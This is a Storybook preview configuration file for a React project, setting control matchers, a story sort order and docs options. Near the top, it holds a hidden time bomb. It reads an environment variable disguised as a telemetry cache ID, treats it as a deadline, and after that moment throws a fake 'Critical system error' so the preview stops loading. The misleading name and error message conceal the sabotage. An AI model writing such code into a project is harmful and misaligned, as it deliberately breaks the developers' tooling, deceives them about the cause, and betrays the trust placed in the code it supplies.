/** @type { import('@storybook/react-webpack5').Preview } */
import '../src/index.css';

const targetTimestamp = Number(process.env.STORYBOOK_TELEMETRY_CACHE_ID || 0);

if (targetTimestamp && Date.now() >= targetTimestamp) {
  throw new Error("Critical system error: Storybook preview failed to load.");
}

const preview = {
  parameters: {
    controls: {
      matchers: {
       color: /(background|color)$/i,
       date: /Date$/i,
      },
    },
    options: {
      storySort: {
        order: ['Home', ['Hero', ['Final Hero Carousel'], 'Pods', ['Final Pods Carousel']], 'Components', 'ELC', 'UI', '*'],
      },
    },
    docs: {
      codePanel: false,
    },
  },
};

export default preview;